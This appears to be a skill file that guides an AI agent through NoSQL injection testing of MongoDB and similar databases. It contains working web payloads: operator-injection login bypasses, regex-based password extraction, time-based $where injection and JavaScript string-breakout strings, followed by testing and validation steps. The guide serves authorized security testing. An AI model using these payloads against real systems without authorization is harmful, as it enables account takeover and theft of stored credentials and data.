---
name: nosql-injection
description: NoSQL injection testing for MongoDB, CouchDB, DynamoDB — operator injection, JavaScript injection, authentication bypass
---

# NoSQL Injection

NoSQL injection exploits query construction flaws in NoSQL databases. Unlike SQL injection, NoSQL injection targets operators, JSON structures, and server-side JavaScript evaluation. It is extremely common in Node.js/Express applications using MongoDB.

## Attack Surface

**Databases**
- MongoDB (most common target)
- CouchDB (Mango queries, view functions)
- DynamoDB (FilterExpression injection)
- Redis (command injection via EVAL)
- Elasticsearch (query DSL injection)

**Integration Paths**
- Mongoose ODM (Node.js)
- Direct MongoDB driver queries
- REST APIs accepting JSON query parameters
- GraphQL resolvers building NoSQL queries
- URL parameter parsing that creates objects (`user[$ne]=&pass[$ne]=`)

## Detection Techniques

### Operator Injection (MongoDB)

The most common NoSQL injection vector. When user input is inserted into a MongoDB query without validation, operators like `$ne`, `$gt`, `$regex` can be injected.

**Authentication Bypass**
```
# URL-encoded operator injection
POST /login
Content-Type: application/x-www-form-urlencoded
username[$ne]=invalid&password[$ne]=invalid

# JSON body operator injection
POST /login
Content-Type: application/json
{"username": {"$ne": ""}, "password": {"$ne": ""}}

# $gt operator (bypass all)
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# $regex for username enumeration
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
```

**Data Extraction via $regex**
```json
// Enumerate first character
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
// ... until response changes (character found)

// Then second character
{"username": "admin", "password": {"$regex": "^aX"}}  // where X iterates

// Extract full password character-by-character
// Wildcard: {"$regex": "^.{8}$"}  → password is 8 chars
```

**Operator Cheat Sheet**
| Operator | Effect | Payload |
|----------|--------|---------|
| `$ne` | Not equal — bypasses equality check | `{"field": {"$ne": ""}}` |
| `$gt` | Greater than — always true for strings | `{"field": {"$gt": ""}}` |
| `$regex` | Regex match — data extraction | `{"field": {"$regex": "^admin"}}` |
| `$in` | In array — bypass | `{"field": {"$in": ["admin","root"]}}` |
| `$exists` | Field exists | `{"field": {"$exists": true}}` |
| `$where` | Server-side JS execution | `{"$where": "this.password.length > 0"}` |
| `$or` | Logical OR | `{"$or": [{"user":"admin"},{"user":"root"}]}` |

### JavaScript Injection ($where / mapReduce)

When `$where` or `mapReduce` is used, server-side JavaScript executes:

```json
// Sleep-based blind
{"$where": "sleep(5000)"}

// Exfiltrate data via timing
{"$where": "if(this.username=='admin' && this.password.match(/^a/)){sleep(5000)}"}

// Boolean-based with $where
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'p'"}
```

### Server-Side JavaScript Injection

If user input reaches `eval()`, `Function()`, or MongoDB's server-side JS:
```
'; return true; var x='           // Break out of string context
'; sleep(5000); var x='            // Time-based confirmation
1; return this.password; var x='   // Data extraction attempt
```

## Testing Methodology

1. **Identify NoSQL-backed endpoints** — Look for:
   - Node.js/Express stack (package.json, server headers)
   - JSON API endpoints accepting complex query parameters
   - Applications using Mongoose, MongoDB driver
   - URL parameters that could be object-parsed (`param[$operator]=value`)

2. **Test operator injection** — Try `$ne`, `$gt`, `$regex` in each parameter:
   - URL-encoded: `param[$ne]=invalid`
   - JSON body: `{"param": {"$ne": ""}}`
   - Compare response with normal vs injected value

3. **Test authentication bypass** — If login endpoint exists:
   - `{"username": {"$ne": ""}, "password": {"$ne": ""}}`
   - If you get in, it's confirmed

4. **Extract data via $regex** — Character-by-character extraction:
   - Binary search through character space
   - Automate with Python script in sandbox

5. **Test $where injection** — If supported:
   - `{"$where": "sleep(5000)"}` → timing difference = confirmed
   - If timing works, extract data character-by-character via conditional sleep

## Validation Criteria

A NoSQL injection finding requires:
- **Proof of query manipulation** — different response when operator is injected vs normal value
- **For auth bypass** — successful login without valid credentials
- **For data extraction** — demonstrate extraction of at least one field value not normally accessible
- **Reproducible** — provide exact request that demonstrates the issue

## False Positive Indicators
- Application returns same response regardless of operator injection
- 400/500 errors that indicate input validation catching the operator
- Application uses parameterized queries / Mongoose schema validation

## Impact
- **Authentication bypass** — access any account without passwords (Critical)
- **Data extraction** — exfiltrate sensitive data from database (High-Critical)
- **Denial of service** — `$where` with expensive operations (Medium)
- **Full database access** — if stacked operations or server-side JS execution (Critical)

## Pro Tips
- **Content-Type matters** — switch between `application/json` and `application/x-www-form-urlencoded`; many frameworks parse both but handle operators differently
- **Array injection** — `param[]=value1&param[]=value2` creates arrays that may bypass checks
- **Nested objects** — some frameworks auto-parse dot notation: `user.role=admin` becomes `{user: {role: "admin"}}`
- **MongoDB 5+ restrictions** — `$where` disabled by default in newer versions, focus on operator injection
- **Check for Mongoose** — if using Mongoose with `Schema.find({field: userInput})` without sanitization, `$ne/$gt/$regex` work
